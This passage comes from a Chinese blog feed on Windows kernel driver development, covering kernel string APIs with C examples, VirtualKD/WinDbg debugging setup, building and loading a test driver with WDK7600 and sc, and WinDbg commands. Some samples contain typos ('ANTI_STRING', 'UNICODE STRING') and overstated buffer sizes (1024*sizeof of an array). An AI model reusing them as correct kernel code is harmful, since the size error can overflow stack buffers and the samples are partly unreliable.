<td style="text-align:center">_wcsnset</td>
</tr>
<tr>
<td style="text-align:center">字符串大小写</td>
<td style="text-align:center">RtlUpcaseUnicodeString</td>
<td style="text-align:center">_wcslwr<br>_wcsupr</td>
</tr>
<tr>
<td style="text-align:center">字符大小写</td>
<td style="text-align:center">RtlUpcaseUnicodeChar</td>
<td style="text-align:center">towlower<br>towupper</td>
</tr>
<tr>
<td style="text-align:center">字符串格式化</td>
<td style="text-align:center">RtlStringCbPrintfW<br>RtlStringCbPrintfExW<br>RtlStringCchPrintfW<br>RtlStringCchPrintfExW</td>
<td style="text-align:center">swprintf<br>_snwprintf</td>
</tr>
<tr>
<td style="text-align:center">可变字符串格式化</td>
<td style="text-align:center">RtlStringCbVPrintfW<br>RtlStringCbVPrintfExW<br>RtlStringCchVPrintfW<br>RtlStringCchVPrintfExW</td>
<td style="text-align:center">vswprintff<br>_vsnwprintf</td>
</tr>
<tr>
<td style="text-align:center">字符串转数字</td>
<td style="text-align:center">RtlIntegerToUnicodeString<br>RtlUnicodeStringToInteger</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">W版转A版</td>
<td style="text-align:center">RtlUnicodeStringToAnsiString</td>
<td style="text-align:center">_itow</td>
</tr>
<tr>
<td style="text-align:center">字符串逆转</td>
<td style="text-align:center"></td>
<td style="text-align:center">_wcsrev</td>
</tr>
<tr>
<td style="text-align:center">字符串内存释放</td>
<td style="text-align:center">RtlFreeUnicodeString</td>
</tr>
</tbody>
</table>
<p>以上含Cb和Cch的为内核安全字符串函数，具体可以参考<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntstrsafe/" target="_blank" rel="noopener">WDK帮助文档</a></p>
<h2 id="部分函数代码示例"><a href="#部分函数代码示例" class="headerlink" title="部分函数代码示例"></a>部分函数代码示例</h2><p>内核编程中，一般字符串不以0结尾了，而是使用了如下结构定义，分别是Unicode字符串和ANSI字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span>&#123;</span></span><br><span class="line">    USHORT Length;		<span class="comment">// 字符串长度（字节数）</span></span><br><span class="line">    USHORT MaximumLength;	<span class="comment">// 字符串缓冲区的长度（字节数）</span></span><br><span class="line">    PWSTR Buffer;		<span class="comment">// 字符串缓冲区</span></span><br><span class="line">&#125;UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span>&#123;</span></span><br><span class="line">    USHORT Length;		<span class="comment">// 字符串长度（字节数）</span></span><br><span class="line">    USHORT MaximumLength;	<span class="comment">// 字符串缓冲区的长度（字节数）</span></span><br><span class="line">    PSTR Buffer;		<span class="comment">// 字符串缓冲区</span></span><br><span class="line">&#125;ANSI_STRING, *PANSI_STRING;</span><br></pre></td></tr></table></figure>
<h3 id="字符串初始化和字符串拷贝"><a href="#字符串初始化和字符串拷贝" class="headerlink" title="字符串初始化和字符串拷贝"></a>字符串初始化和字符串拷贝</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">UNICODE_STRING Ustring = &#123; wcslen(<span class="string">L"HelloUnicode"</span>) * <span class="keyword">sizeof</span>(WCHAR),wcslen(<span class="string">L"HelloUnicode"</span>) * <span class="keyword">sizeof</span>(WCHAR)+<span class="number">1</span>,<span class="string">L"HelloUnicode"</span> &#125;;</span><br><span class="line">ANSI_STRING AString = &#123; <span class="built_in">strlen</span>(<span class="string">"HelloANSI"</span>) * <span class="keyword">sizeof</span>(CHAR),<span class="built_in">strlen</span>(<span class="string">"HelloANSI"</span>) * <span class="keyword">sizeof</span>(CHAR)+<span class="number">1</span>,<span class="string">"HelloANSI"</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是不是觉得上面的字符串初始化很麻烦</span></span><br><span class="line"><span class="comment">// 其实我们一般使用RTL_CONSTANT_STRING来替我们来完成以上的步骤</span></span><br><span class="line"><span class="comment">// 我们只需要填写字符串内容就完成了像之前一样初始化一个字符串</span></span><br><span class="line">UNICODE_STRING Ustring = RTL_CONSTANT_STRING(<span class="string">L"HelloUnicode"</span>);</span><br><span class="line">ANSI_STRING AString = RTL_CONSTANT_STRING(<span class="string">"HelloANSI"</span>);</span><br><span class="line"><span class="comment">// 打印字符串字符串</span></span><br><span class="line">KdPrint((<span class="string">"%wZ\n"</span>, &amp;Ustring));</span><br><span class="line">KdPrint((<span class="string">"%Z\n"</span>, &amp;AString));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 另一种初始化字符串</span></span><br><span class="line">UNICODE_STRING ustr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ANTI_STRING astr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitUnicodeString(&amp;ustr, <span class="string">L"HelloUnicode"</span>);</span><br><span class="line">RtlInitAnsiString(&amp;astr, <span class="string">"HelloANSI"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用栈上的缓冲区初始化字符串</span></span><br><span class="line"><span class="comment">// 当然也可以用堆内存初始化字符串</span></span><br><span class="line">UNICODE_STRING usDest;</span><br><span class="line">ANSI_STRING asDest;</span><br><span class="line">WCHAR wcstr[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">CHAR asstr[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitEmptyUnicodeString(&amp;usDest, wcstr, <span class="number">1024</span> * <span class="keyword">sizeof</span>(wcstr));</span><br><span class="line">RtlInitEmptyAnsiString(&amp;asDest, asstr, <span class="number">1024</span> * <span class="keyword">sizeof</span>(asstr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串拷贝</span></span><br><span class="line">RtlCopyUnicodeString(&amp;usDest, &amp;ustr);</span><br><span class="line">RtlCopyString(&amp;asDest, &amp;astr);</span><br><span class="line">KdPrint((<span class="string">"%wZ\n"</span>, &amp;usDest));</span><br><span class="line">KdPrint((<span class="string">"%Z\n"</span>, &amp;asDest));</span><br></pre></td></tr></table></figure>
<h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Unicode版字符串比较</span></span><br><span class="line">UNICODE_STRING Ustring = RTL_CONSTANT_STRING(<span class="string">L"Hello"</span>);</span><br><span class="line">UNICODE_STRING usDest = RTL_CONSTANT_STRING(<span class="string">L"Unicode"</span>);</span><br><span class="line">LONG usRet = RtlCompareUnicodeString(&amp;Ustring, &amp;usDest, TRUE);</span><br><span class="line"><span class="keyword">if</span> (usRet == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((<span class="string">"usstring1 = usstring2\n"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (usRet &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((<span class="string">"usstring1 &lt; usstring2\n"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((<span class="string">"usstring1 &gt; usstring2\n"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ANSI版字符串比较</span></span><br><span class="line">ANSI_STRING AString = RTL_CONSTANT_STRING(<span class="string">"Hello"</span>);</span><br><span class="line">ANSI_STRING asDest = RTL_CONSTANT_STRING(<span class="string">"ANSI"</span>);</span><br><span class="line">usRet = RtlCompareString(&amp;AString, &amp;asDest, TRUE);</span><br><span class="line"><span class="keyword">if</span> (usRet == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((<span class="string">"asstring1 = asstring2\n"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (usRet &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((<span class="string">"asstring1 &lt; asstring2\n"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((<span class="string">"asstring1 &gt; asstring2\n"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="字符串转大写"><a href="#字符串转大写" class="headerlink" title="字符串转大写"></a>字符串转大写</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Unicode字符串大小写转换</span></span><br><span class="line">UNICODE_STRING us = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">UNICODE_STRING usDest = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitUnicodeString(&amp;us, <span class="string">L"aBcDef"</span>);</span><br><span class="line">RtlUpcaseUnicodeString(&amp;usDest, &amp;us, FALSE);</span><br><span class="line">KdPrint((<span class="string">"%wZ\n"</span>, &amp;usDest));</span><br><span class="line"></span><br><span class="line"><span class="comment">// ANSI字符串大小写转换</span></span><br><span class="line">ANSI_STRING as = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ANSI_STRING asDest = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitAnsiString(&amp;as, <span class="string">"qwErTy"</span>);</span><br><span class="line">RtlUpperString(&amp;asDest, &amp;as);</span><br><span class="line">KdPrint((<span class="string">"%Z\n"</span>, &amp;asDest));</span><br></pre></td></tr></table></figure>
<h3 id="字符串数字互转"><a href="#字符串数字互转" class="headerlink" title="字符串数字互转"></a>字符串数字互转</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ULONG usValue;</span><br><span class="line">UNICODE_STRING us = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">// 字符串转数字</span></span><br><span class="line">RtlInitUnicodeString(&amp;us, <span class="string">L"-123"</span>);</span><br><span class="line">RtlUnicodeStringToInteger(&amp;us, <span class="number">10</span>, &amp;usValue);</span><br><span class="line">KdPrint((<span class="string">"%d\n"</span>, usValue));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字转字符串</span></span><br><span class="line">RtlIntegerToUnicodeString(<span class="number">1234</span>, <span class="number">10</span>, &amp;usDest);</span><br><span class="line">KdPrint((<span class="string">"%wZ\n"</span>, &amp;usDest));</span><br></pre></td></tr></table></figure>
<h3 id="A版W版字符串互转"><a href="#A版W版字符串互转" class="headerlink" title="A版W版字符串互转"></a>A版W版字符串互转</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Unicode转ANSI字符串</span></span><br><span class="line">ANSI_STRING asDest = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">UNICODE_STRING us = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitUnicodeString(&amp;us, <span class="string">L"Unicode转Ansi测试"</span>);</span><br><span class="line">RtlUnicodeStringToAnsiString(&amp;asDest, &amp;us, FALSE);</span><br><span class="line">KdPrint((<span class="string">"%Z\n"</span>, &amp;asDest));</span><br><span class="line"></span><br><span class="line"><span class="comment">// ANSI转Unicode字符串</span></span><br><span class="line">ANSI_STRING as = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">UNICODE_STRING usDest = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitAnsiString(&amp;as, <span class="string">"Ansi转Unicode测试"</span>);</span><br><span class="line">RtlAnsiStringToUnicodeString(&amp;usDest, &amp;as, FALSE);</span><br><span class="line">KdPrint((<span class="string">"%wZ\n"</span>, &amp;usDest));</span><br></pre></td></tr></table></figure>
<h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">UNICODE STRING us = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ANSI_STRING as = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitUnicodeString(&amp;us, <span class="string">L"Unicode字符串"</span>);</span><br><span class="line">RtlInitAnsiString(&amp;as, <span class="string">"格式化"</span>);</span><br><span class="line">RtlUnicodeStringPrintf(&amp;usDest,<span class="string">L"%s%wZ%Z%d%S"</span>,<span class="string">L"这是一个测试"</span>,&amp;us,&amp;as,<span class="number">1234</span>,<span class="string">"测试"</span>);</span><br><span class="line">KdPrint((<span class="string">"%wZ\n"</span>, &amp;usDest));</span><br></pre></td></tr></table></figure>
<h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 拼接UNICODE_STRING和WCHAR字符串</span></span><br><span class="line">WCHAR usSrcBuffer[<span class="number">1024</span>];</span><br><span class="line">UNICODE_STRING usDest = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">UNICODE_STRING usSrc = RTL_CONSTANT_STRING(<span class="string">L"Unicode"</span>);</span><br><span class="line">RtlInitEmptyUnicodeString(&amp;usDest, usSrcBuffer, <span class="number">1024</span> * <span class="keyword">sizeof</span>(WCHAR));</span><br><span class="line">RtlCopyUnicodeString(&amp;usDest, &amp;usSrc);</span><br><span class="line">RtlAppendUnicodeToString(&amp;usDest,<span class="string">L"StringCatTest"</span>);</span><br><span class="line">KdPrint((<span class="string">"%wZ\n"</span>, &amp;usDest));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼接两个UNICODE_STRING</span></span><br><span class="line">NTSTATUS status;</span><br><span class="line">UNICODE_STRING usDest = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitEmptyUnicodeString(&amp;usDest, (PWCH)ExAllocatePool(PagedPool, <span class="number">1024</span>), <span class="number">1024</span>);</span><br><span class="line">UNICODE_STRING usSrc = RTL_CONSTANT_STRING(<span class="string">L"CatUnicodeStringTest"</span>);</span><br><span class="line">status = RtlAppendUnicodeStringToString(&amp;usDest, &amp;usSrc);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((<span class="string">"字符串拼接错误%x\n"</span>, status));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((<span class="string">"%wZ\n"</span>, &amp;usDest));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>WindowsDriver</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows双机调试环境搭建</title>
    <url>/WindowsDualDebuggingEnvConfiguration.html</url>
    <content><![CDATA[<h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>首先我们谷歌VirtualKD一般第一个为官网(VirtualKD官网不是https所以就不放出来了)，然后下载VirtualKD并安装到实体机，目前官方最新版3.0</p>
<img src="/WindowsDualDebuggingEnvConfiguration/1.jpg" title="This is an example image">
<a id="more"></a>
<p>到安装目录下的结构如下，根据自己的系统版本位数选择<code>vmmon.exe</code>或者<code>vmmon64.exe</code>启动，我这里的环境是64位所以选择启动<code>vmmon64.exe</code></p>
<img src="/WindowsDualDebuggingEnvConfiguration/2.jpg" title="This is an example image">
<p>之后我们选择设置调试器路径如箭头</p>
<img src="/WindowsDualDebuggingEnvConfiguration/3.jpg" title="This is an example image">
<p>选择你的WinDbg路径，WinDbg需要和你vmware虚拟机中的系统位数相同，由于我是64位系统所以我选择的是WinDbgx64</p>
<img src="/WindowsDualDebuggingEnvConfiguration/4.jpg" title="This is an example image">
<p>之后我们开启vmware虚拟机选择对应系统启动，系统启动后VirtualKD已经识别到了我们的vmware虚拟机版本</p>
<img src="/WindowsDualDebuggingEnvConfiguration/5.jpg" title="This is an example image">
<p>然后我们要到VirtualKD的安装目录把target文件夹拷贝到虚拟机中，然后点击<code>vminstall.exe</code></p>
<img src="/WindowsDualDebuggingEnvConfiguration/6.jpg" title="This is an example image">
<p>点击<code>install</code>然后点击是</p>
<img src="/WindowsDualDebuggingEnvConfiguration/7.jpg" title="This is an example image">
<p>接着虚拟机会重启，然后我们选第二项VirtualKD的调式选项按回车键</p>
<img src="/WindowsDualDebuggingEnvConfiguration/8.jpg" title="This is an example image">
<p>系统开始启动VirtualKD应该会为我们自动打开WinDbg，并且在下载符号文件</p>
<img src="/WindowsDualDebuggingEnvConfiguration/9.jpg" title="This is an example image">
<p>如果没有自动开启WinDbg我们手动点击Run debugger开启</p>
<img src="/WindowsDualDebuggingEnvConfiguration/10.jpg" title="This is an example image">
<p>我们还需要配置符号文件，打开WinDbg然后单击file选择Symbol File Path，如下配置前面路径为符号文件本地路径，后面的默认为微软官方的符号下载服务器，记得设置完符号路径选择保存工作空间否存下次打开WinDbg设置就会清空</p>
<img src="/WindowsDualDebuggingEnvConfiguration/11.jpg" title="This is an example image">
<p>之后重启虚拟机打开WinDbg等待符号文件下载完成</p>
<img src="/WindowsDualDebuggingEnvConfiguration/12.jpg" title="This is an example image">
<p>待符号文件下载完成发现WinDbg自动给我们下了个断点，我们按快捷键<code>F5</code>或者输入命令<code>g</code>让系统跑起来</p>
<img src="/WindowsDualDebuggingEnvConfiguration/13.jpg" title="This is an example image">
<p>没让系统跑起来之前会卡在这里</p>
<img src="/WindowsDualDebuggingEnvConfiguration/14.jpg" title="This is an example image">
<p>至此Windows下双机调试环境就搭建完成了</p>
<hr>]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>WinDbg</tag>
        <tag>VirtualKD</tag>
      </tags>
  </entry>
  <entry>
    <title>安装并配置WDK7600编译Windows驱动程序</title>
    <url>/USE_WDK7600_CompileWindowsDrivers.html</url>
    <content><![CDATA[<h2 id="下载WDK7600"><a href="#下载WDK7600" class="headerlink" title="下载WDK7600"></a>下载WDK7600</h2><p>谷歌输入wdk7600找到微软官方的<a href="https://www.microsoft.com/en-us/download/details.aspx?id=11800" target="_blank" rel="noopener">下载地址</a>点击进入</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/1.jpg" title="This is an example image">
<a id="more"></a>
<p>然后点击下载(注意wdk7600只有英语版的)</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/2.jpg" title="This is an example image">
<h2 id="安装WDK7600"><a href="#安装WDK7600" class="headerlink" title="安装WDK7600"></a>安装WDK7600</h2><p>下载的文件是个iso文件如果在win10系统下可以直接装载进行安装，由于我是在虚拟机win7环境下进行安装所以对iso文件进行解压并安装，如图点击KitSetup.exe进行安装</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/3.jpg" title="This is an example image">
<p>只要勾选图中这两项进行安装就可以</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/4.jpg" title="This is an example image">
<p>选择安装到默认目录就可以了</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/5.jpg" title="This is an example image">
<p>出现这个界面勾上我同意的选项点ok就开始安装了</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/6.jpg" title="This is an example image">
<p>出现此页面代表WDK7600已经安装成功我们点击Finish就可以</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/7.jpg" title="This is an example image">
<h2 id="编写Windows驱动"><a href="#编写Windows驱动" class="headerlink" title="编写Windows驱动"></a>编写Windows驱动</h2><p>一个Windows驱动至少需要3个文件才能使用WDK7600进行正常编译，一个源文件一个makefile文件一个sources文件</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/8.jpg" title="This is an example image">
<p>makefile文件编写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!INCLUDE $(NTMAKEENV)\makefile.def	// 将makefile.def包含在当前环境下</span><br></pre></td></tr></table></figure>
<p>sources文件编写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TARGETPATH=obj		// 驱动文件最终生成的目录</span><br><span class="line">TARGETNAME=DriverTest 	// 生成的驱动文件名称</span><br><span class="line">TARGETTYPE=DRIVER	// 类型就是驱动</span><br><span class="line"></span><br><span class="line">SOURCES=DriverTest.c	// 源文件名称</span><br></pre></td></tr></table></figure>
<p>驱动源文件编写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;ntddk.h&gt;</span><br><span class="line"></span><br><span class="line">VOID Unload(PDRIVER_OBJECT DriverObject)</span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((&quot;DriverUnload&quot;));	// 输出内核调式信息</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegPath)</span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((&quot;DriverLoad&quot;));	// 输出内核调式信息</span><br><span class="line">	DriverObject-&gt;DriverUnload = Unload;	// 注册驱动卸载函数</span><br><span class="line">	return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="编译驱动"><a href="#编译驱动" class="headerlink" title="编译驱动"></a>编译驱动</h2><p>根据操作系统版本和位数选择对应的命令行，我的环境是win7x64的</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/9.jpg" title="This is an example image">
<p>使用命令行cd进入驱动源文件目录，然后使用bld命令进行编译，提示信息告诉我们已经编译成功没有出现问题，如果编译出现问题会有错误提示信息</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/10.jpg" title="This is an example image">
<p>此图为驱动编译成功所生成的文件，符号文件以及驱动文件.sys</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/11.jpg" title="This is an example image">
<h2 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h2><p>win7默认对调式信息进行了过滤我们需要通过修改注册表开启调式信息输出功能，新建一个任意文件名的<code>.reg</code>后缀文件，将如下内容拷贝到<code>.reg</code>文件中双击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter]</span><br><span class="line">&quot;DEFAULT&quot;=dword:0000000f</span><br></pre></td></tr></table></figure>
<p>查看注册表是否创建成功</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/12.jpg" title="This is an example image">
<p>使用Windows服务管理控制命令sc进行加载驱动，注意图中命令的空格，图中命令只要替换成你自己对应的驱动名称和驱动文件所在路径就可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt;cd C:\MyDriver\objchk_win7_amd64\amd64</span><br><span class="line">C:\MyDriver\objchk_win7_amd64\amd64&gt;sc create DriverTest binpath= C:\MyDriver\objchk_win7_amd64\amd64\DriverTest.sys type= kernel</span><br><span class="line">[SC] CreateService 成功</span><br><span class="line">C:\MyDriver\objchk_win7_amd64\amd64&gt;sc start DriverTest</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: DriverTest</span><br><span class="line">        TYPE               : 1  KERNEL_DRIVER</span><br><span class="line">        STATE              : 4  RUNNING</span><br><span class="line">                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line">        PID                : 0</span><br><span class="line">        FLAGS              :</span><br><span class="line">C:\MyDriver\objchk_win7_amd64\amd64&gt;sc stop DriverTest</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: DriverTest</span><br><span class="line">        TYPE               : 1  KERNEL_DRIVER</span><br><span class="line">        STATE              : 1  STOPPED</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line">C:\MyDriver\objchk_win7_amd64\amd64&gt;sc delete DriverTest</span><br><span class="line">[SC] DeleteService 成功</span><br></pre></td></tr></table></figure>
<p>我们输入<code>sc start DriverTest</code>命令加载驱动就会打印<code>DriverLoad</code>字符串，我们输入<code>sc stop DriverTest</code>命令停止驱动就会打印<code>DriverUnload</code>字符串</p>
<img src="/USE_WDK7600_CompileWindowsDrivers/13.jpg" title="This is an example image">
<hr>]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>WindowsDriver</tag>
        <tag>WDK7600</tag>
      </tags>
  </entry>
  <entry>
    <title>WinDbg命令及使用</title>
    <url>/WinDbg_Command.html</url>
    <content><![CDATA[<p>推荐资料<a href="https://bbs.pediy.com/thread-178808-1.htm" target="_blank" rel="noopener">看雪论坛WINDBG参考手册V0.6</a></p>
<p>本文章主要记录WinDbg常用的命令和使用技巧等，会持续更新</p>
<h2 id="符号相关命令"><a href="#符号相关命令" class="headerlink" title="符号相关命令"></a>符号相关命令</h2><ul>
<li><p>重新加载符号：<code>.reload</code>、<code>!reload</code></p>
</li>
<li><p>查看符号路径：<code>.sympath</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; .sympath</span><br><span class="line">Symbol search path is: srv*c:\symbolslocal*http://msdl.microsoft.com/download/symbols</span><br><span class="line">Expanded Symbol search path is: srv*c:\symbolslocal*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure>
</li>
<li><p>加载符号：<code>ld CrashMe</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; ld CrashMe</span><br><span class="line">Symbols already loaded for CrashMe</span><br><span class="line">0:000&gt; lm m CrashMe</span><br><span class="line">start    end        module name</span><br><span class="line">00400000 006d2000   CrashMe  C (private pdb symbols)  C:\Users\Likte\Desktop\CrashMe\debug\CrashMe.pdb</span><br></pre></td></tr></table></figure>
</li>
</ul>
<a id="more"></a>
<ul>
<li>显示加载符号信息：<code>!sym</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">开启加载符号时显示匹配路径</span><br><span class="line">0:000&gt; !sym noisy</span><br><span class="line">noisy mode - symbol prompts on</span><br><span class="line">重新加载模块</span><br><span class="line">0:000&gt; .reload /f CrashMe.exe</span><br><span class="line">日志输出告诉我们查找pdb符号时去了哪些路径寻找和符号加载失败和成功信息</span><br><span class="line">SYMSRV:  c:\symbolslocal\CrashMe.pdb\BC84AFB5E68C45F2A8C070914C4E68B72\CrashMe.pdb not found</span><br><span class="line">SYMSRV:  http://msdl.microsoft.com/download/symbols/CrashMe.pdb/BC84AFB5E68C45F2A8C070914C4E68B72/CrashMe.pdb not found</span><br><span class="line">*** WARNING: Unable to verify checksum for CrashMe.exe</span><br><span class="line">DBGHELP: CrashMe - private symbols &amp; lines </span><br><span class="line">         C:\Users\Likte\Desktop\CrashMe\debug\CrashMe.pdb</span><br><span class="line">重新加载ntdll符号</span><br><span class="line">0:000&gt; .reload /f ntdll.dll</span><br><span class="line">DBGHELP: ntdll - public symbols  </span><br><span class="line">         c:\symbolslocal\wntdll.pdb\DCCFF2D483FA4DEE81DC04552C73BB5E2\wntdll.pdb</span><br><span class="line">关闭模块加载匹配信息，关闭之后加载模块时不会再显示上方的路径匹配信息</span><br><span class="line">0:000&gt; !sym quiet</span><br><span class="line">quiet mode - symbol prompts on</span><br><span class="line">显示配置信息</span><br><span class="line">0:000&gt; !sym</span><br><span class="line">!sym &lt;noisy/quiet - prompts/prompts off&gt; - quiet mode - symbol prompts on</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="调式执行命令"><a href="#调式执行命令" class="headerlink" title="调式执行命令"></a>调式执行命令</h2><ul>
<li><p>运行程序命令：<code>g</code></p>
<ul>
<li>快捷键：<code>F5</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行到指定地址</span><br><span class="line">g address</span><br><span class="line">让被冻结的1号线程继续执行</span><br><span class="line">~1 g</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>运行到光标所在处快捷键：<code>F7</code></p>
</li>
<li><p>单步步入命令：<code>t</code></p>
<ul>
<li>快捷键：<code>F8</code></li>
</ul>
</li>
<li><p>单步步过命令：<code>p</code></p>
<ul>
<li>快捷键：<code>F10</code></li>
</ul>
</li>
<li><p>重新运行调试程序快捷键：<code>Ctrl+Shift+F5</code></p>
</li>
<li><p>执行到返回命令：<code>gu</code></p>
</li>
<li><p>忽略异常继续执行命令：<code>gn</code></p>
</li>
<li><p>从断点处继续执行命令：<code>gc</code></p>
</li>
<li><p>异常被处理继续执行命令：<code>gh</code></p>
</li>
</ul>
<h2 id="断点相关命令"><a href="#断点相关命令" class="headerlink" title="断点相关命令"></a>断点相关命令</h2><ul>
<li><p>软件断点：<code>bp</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接对某个地址下断：bp 0x401000</span><br><span class="line">Windbg会自动对OEP对应地址下断：bp $exentry</span><br></pre></td></tr></table></figure>
</li>
<li><p>内存断点：<code>ba</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令格式</span><br><span class="line">ba access size address</span><br><span class="line">access：内存断点的触发权限,e(执行)，w(写)，r(读/写)</span><br><span class="line">size：下断的字节,如1、2、4、8</span><br><span class="line">address：需要下断的内存地址</span><br></pre></td></tr></table></figure>
</li>
<li><p>符号断点：<code>bm</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">支持对多个符号下断</span><br><span class="line">对CCrashMeDlg所有成员下断：bm CrashMe!CCrashMeDlg::*</span><br></pre></td></tr></table></figure>
</li>
<li><p>也是符号断点：<code>bu</code></p>
